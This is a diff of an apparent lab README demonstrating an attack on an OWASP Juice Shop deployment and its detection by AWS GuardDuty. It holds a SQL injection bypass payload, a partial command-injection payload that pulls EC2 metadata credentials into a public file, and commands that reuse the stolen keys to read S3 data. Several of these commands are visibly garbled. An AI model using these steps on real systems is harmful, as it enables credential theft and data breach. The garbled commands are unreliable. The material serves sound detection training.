@@ -22,17 +22,17 @@ The infrastructure relies on different resources across three main categories: c
 
 ## Phase 1: Infrastructure Deployment 
 
-![Infrastructure Diagram](images/infrastructure-diagram.png) [cite: 676, 684]
+![Infrastructure Diagram](images/infrastructure-diagram.png) 
 
 To simulate a real-world environment, the infrastructure was deployed using Infrastructure as Code (laC).  Since threat detection using GuardDuty is the main goal of this project, we will not go into detail on how to use the CloudFormation template (YAML or JSON file) in AWS. 
 
 1. A CloudFormation template was launched to deploy the OWASP Juice Shop web application.  Deploying the environment via CloudFormation allowed for immediate testing of the application's security posture. 
 
-![CloudFormation Deployment](images/cloudformation-deployment.png) [cite: 689, 713]
+![CloudFormation Deployment](images/cloudformation-deployment.png) 
 
 2. We can then access the web application through the output link of our cloud deployment. 
 
-![CloudFormation Outputs](images/cloudformation-outputs.png) [cite: 720, 753]
+![CloudFormation Outputs](images/cloudformation-outputs.png) 
 
 3. This CloudFormation template also deploys an S3 bucket for storage.  This bucket will then store a file named important-information.txt, which is meant to simulate sensitive data.  Later, we're going to access this file and read its contents by performing a data breach. 
 
@@ -43,11 +43,11 @@ To simulate a real-world environment, the infrastructure was deployed using Infr
 ### 1. SQL Injection (Authentication Bypass) 
 The first phase of the attack targeted the application's login mechanism.  By manipulating the SQL query used for login, the authentication check was bypassed. 
 
-![SQL Injection Login](images/SQL-injection.png) [cite: 761, 768]
+![SQL Injection Login](images/SQL-injection.png) 
 
-The payload ' or 1=1;-- was entered into the email field, forcing the database query to evaluate to true. [cite: 769, 770]
+The payload ' or 1=1;-- was entered into the email field, forcing the database query to evaluate to true. 
 
-![Authentication Bypassed](images/authentication-bypassed.png) [cite: 771, 779]
+![Authentication Bypassed](images/authentication-bypassed.png) 
 
 ### 2. Command Injection and Credential Exfiltration 
 Following the initial breach, the objective shifted to exfiltrating cloud environment credentials.  A JavaScript payload was executed within the application's user profile username field.  The script accessed the EC2 instance metadata service to retrieve a session token and IAM credentials. 
@@ -62,33 +62,33 @@ echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") &&
 echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}
 ``` [cite: 785, 786, 787, 788, 789, 790]
 
-![Command Injection](images/username-field.png) [cite: 791, 795]
+![Command Injection](images/username-field.png) 
 
 These stolen credentials were then saved to a public JSON file (/assets/public/credentials.json), making them accessible over the internet. 
 
-![Stolen Credentials](images/stolen-credentials.png) [cite: 797, 809]
+![Stolen Credentials](images/stolen-credentials.png) 
 
 ### 3. Data Theft via AWS CloudShell 
-Using the compromised IAM credentials, the attack was escalated to access secure cloud storage [cite: 811, 812]
+Using the compromised IAM credentials, the attack was escalated to access secure cloud storage 
 
-![CloudShell Data Theft](images/cloudshell-1.png) [cite: 813, 843]
+![CloudShell Data Theft](images/cloudshell-1.png) 
 
-![CloudShell Data Theft](images/cloudshell-2.png) [cite: 844, 874]
+![CloudShell Data Theft](images/cloudshell-2.png) 
 
 
-AWS CloudShell was utilized to configure a new CLI profile using the stolen AccessKeyld and SecretAccessKey. [cite: 874, 875]
+AWS CloudShell was utilized to configure a new CLI profile using the stolen AccessKeyld and SecretAccessKey. 
 
 ```bash
 $aws configure set profile.stolen.region ap-southeast-1$ aws configure set profile.stolen.aws_access_key_id cat credentials.json | jq-r.AccessKeyId'
 $aws configure set profile.stolen.aws_secret_access_key cat credentials.json | jqr.SecretAccessKey"$ aws configure set profile.stolen.aws_session_token cat credentials.json | jqr.Token"
 ``` [cite: 876, 877, 878, 879]
 
-The attacker profile successfully accessed a secure S3 bucket and downloaded a file named secret-information.txt, completing the data exfiltration objective. [cite: 880, 881]
+The attacker profile successfully accessed a secure S3 bucket and downloaded a file named secret-information.txt, completing the data exfiltration objective. 
 
 ```bash
 ~$ cat secret-information.txt
 Dang it if you can see this text, you're accessing our private information!
-``` [cite: 882, 883]
+``` 
 
 ---
 
@@ -97,8 +97,8 @@ With the attacks executed, the focus shifted to analyzing the environment's auto
 
 1. AWS GuardDuty successfully detected the unauthorized activity and generated a high-severity finding. 
 
-![GuardDuty Findings](images/guardduty-1.png) [cite: 887, 911]
+![GuardDuty Findings](images/guardduty-1.png) 
 
-The finding, categorized as an unauthorized use of EC2 instance credentials from a remote AWS account, identified the exact role (GuardDuty-project-lan-TheRole-JYRr30gc5FV0) that was compromised. [cite: 912, 913]
+The finding, categorized as an unauthorized use of EC2 instance credentials from a remote AWS account, identified the exact role (GuardDuty-project-lan-TheRole-JYRr30gc5FV0) that was compromised. 
 
-![GuardDuty Detailed Finding](images/guardduty-results.png) [cite: 914, 915]
+![GuardDuty Detailed Finding](images/guardduty-results.png) 
